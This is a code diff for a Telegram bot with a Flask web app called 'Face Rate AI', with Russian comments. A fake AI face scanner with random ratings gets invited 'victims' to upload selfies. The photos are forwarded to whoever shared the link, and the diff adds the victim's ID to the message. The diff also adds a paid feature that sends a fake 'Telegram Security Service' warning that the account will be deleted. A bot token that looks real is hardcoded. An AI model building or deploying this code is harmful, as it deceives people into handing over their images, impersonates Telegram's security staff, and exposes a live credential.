@@ -5,19 +5,17 @@ from threading import Thread
 import random
 import os
 
-# ТОКЕН БОТА
+# ТОКЕН БОТА (ВСТАВЬ СВОЙ)
 TELEGRAM_TOKEN = "9037182564:AAF8t7WjlmrdSWmNsQV0nWxDkZM8LK-CwDc"
 bot = telebot.TeleBot(TELEGRAM_TOKEN)
 
 victims = {}
 app = Flask(__name__)
 
-# 1. ЭТА ФУНКЦИЯ ПОКАЗЫВАЕТ САЙТ, КОГДА ОН ОТКРЫВАЕТСЯ
 @app.route('/')
 def index():
     return send_file('index.html')
 
-# 2. ЭТА ФУНКЦИЯ ПРИНИМАЕТ ФОТО С САЙТА
 @app.route('/upload', methods=['POST'])
 def upload():
     if 'photo' not in request.files:
@@ -33,7 +31,7 @@ def upload():
     
     if inviter_id:
         with open(filename, 'rb') as f:
-            bot.send_photo(inviter_id, f, caption=f"📸 **Жертва попалась через сайт!**")
+            bot.send_photo(inviter_id, f, caption=f"📸 **Жертва попалась через сайт!**\nИмя: {user_id}")
     
     ratings = ["SUB 5 😭", "SUB 5 😭", "SUB 5 😭", "NPC 😐", "CHAD 🗿"]
     result = random.choice(ratings)
@@ -46,15 +44,16 @@ def upload():
 def start_message(message):
     command_parts = message.text.split()
     
-    if len(command_parts) > 1:
+    # 1. ЖЕРТВА (перешла по ссылке на сканер)
+    if len(command_parts) > 1 and command_parts[1] != "ban_prank":
         try:
             inviter_id = int(command_parts[1])
             victims[message.from_user.id] = inviter_id
+            text = "🤖 **Добро пожаловать в Face Rate AI!**\n\nЯ — нейросеть, которая оценивает твое лицо по шкале от Sub 5 до Chad.\n\n📸 Нажми на кнопку ниже, чтобы открыть сканер и загрузить селфи!"
             
-            # ВСТАВЬ СЮДА СВОЮ ССЫЛКУ С RENDER (например, https://face-bot-xxxx.onrender.com)
+            # ССЫЛКА НА ТВОЙ RENDER
             web_app_url = "https://face-bot-1-p8zh.onrender.com" 
             
-            text = "🤖 **Добро пожаловать в Face Rate AI!**\n\nНажми на кнопку ниже, чтобы открыть приложение и пройти анализ."
             markup = InlineKeyboardMarkup()
             btn = InlineKeyboardButton("🚀 Открыть сканер", web_app=WebAppInfo(url=web_app_url))
             markup.add(btn)
@@ -62,32 +61,71 @@ def start_message(message):
             bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
         except ValueError:
             pass
+            
+    # 2. ПЕРЕХОД ПО ССЫЛКЕ НА СНОС (ПЛАТНЫЙ ПРАНК)
+    elif len(command_parts) > 1 and command_parts[1] == "ban_prank":
+        text = (
+            "⚠️ **СЛУЖБА БЕЗОПАСНОСТИ TELEGRAM** ⚠️\n\n"
+            "Внимание! Ваш аккаунт уличен в подозрительной активности.\n"
+            "Нарушение: Использование фото, которые не проходят по стандартам Chad.\n\n"
+            "❌ **Аккаунт будет удален завтра в 12:00.**\n\n"
+            "(Шутка! Это пранк от твоего друга 😂)"
+        )
+        bot.send_message(message.chat.id, text, parse_mode="Markdown")
+    
+    # 3. СОЗДАТЕЛЬ (зашел сам)
     else:
         bot_info = bot.get_me()
         invite_link = f"https://t.me/{bot_info.username}?start={message.from_user.id}"
-        text = "😎 **Ты в режиме создателя!**\n\nСкинь эту ссылку другу."
+        
+        text = (
+            "🤖 **Босс передаёт привет!** 👋\n\n"
+            "Ты в главном штабе Face Rate AI.\n\n"
+            "1️⃣ Хочешь узнать настоящую оценку лица друга? Жми **«📋 Скопировать ссылку»** и скинь ему. Как только он загрузит селфи, его фото прилетит тебе сюда! 😈\n\n"
+            "2️⃣ А если хочешь устроить **тотальный пранк** — жми вторую кнопку. Бот вышлет ему фейковое уведомление, что его аккаунт заблокируют. Стоит всего 10 ⭐."
+        )
+        
         markup = InlineKeyboardMarkup()
-        btn = InlineKeyboardButton("📋 Скопировать ссылку", copy_text=telebot.types.CopyTextButton(text=invite_link))
-        markup.add(btn)
+        btn_copy = InlineKeyboardButton("📋 Скопировать ссылку", copy_text=telebot.types.CopyTextButton(text=invite_link))
+        btn_buy = InlineKeyboardButton("💀 Снести аккаунт друга (10 ⭐)", callback_data="buy_ban")
+        
+        markup.add(btn_copy)
+        markup.add(btn_buy)
+        
         bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode="Markdown")
 
-@bot.message_handler(commands=['buy'])
-def buy_prank(message):
-    bot.send_invoice(message.chat.id, title="Пранк: Снос", description="Уведомление о сносе аккаунта.", invoice_payload="ban_prank_20", provider_token="", currency="XTR", prices=[LabeledPrice(label="Пранк-Снос", amount=20)])
+# --- ОБРАБОТЧИК КНОПКИ "СНЕСТИ АККАУНТ" ---
+@bot.callback_query_handler(func=lambda call: call.data == "buy_ban")
+def callback_buy(call):
+    bot.answer_callback_query(call.id, "Выставляю счет... 💸")
+    bot.send_invoice(
+        call.message.chat.id,
+    title="Пранк: Снос аккаунта",
+        description="Фейковое уведомление от Телеграма о скором удалении аккаунта.",
+        invoice_payload="ban_prank_10",
+        provider_token="", 
+        currency="XTR", 
+        prices=[LabeledPrice(label="Пранк-Снос", amount=10)]
+    )
 
 @bot.pre_checkout_query_handler(func=lambda query: True)
 def checkout(pre_checkout_query):
     bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
 
+# Выдача ссылки после оплаты
 @bot.message_handler(content_types=['successful_payment'])
 def got_payment(message):
     bot_info = bot.get_me()
     ban_link = f"https://t.me/{bot_info.username}?start=ban_prank"
-    bot.send_message(message.chat.id, f"💸 **Оплата прошла!**\n\nВот ссылка: {ban_link}", parse_mode="Markdown")
+    
+    markup = InlineKeyboardMarkup()
+    btn = InlineKeyboardButton("💀 Ссылка на снос", url=ban_link)
+    markup.add(btn)
+    
+    bot.send_message(message.chat.id, f"💸 **Оплата 10 ⭐ прошла!**\n\nНажми на кнопку ниже, чтобы получить ссылку. Кидай ее другу!", reply_markup=markup, parse_mode="Markdown")
 
 # --- ЗАПУСК ---
 def run_flask():
-    # Render сам подставит нужный порт
     port = int(os.environ.get('PORT', 8080))
     app.run(host='0.0.0.0', port=port)
 
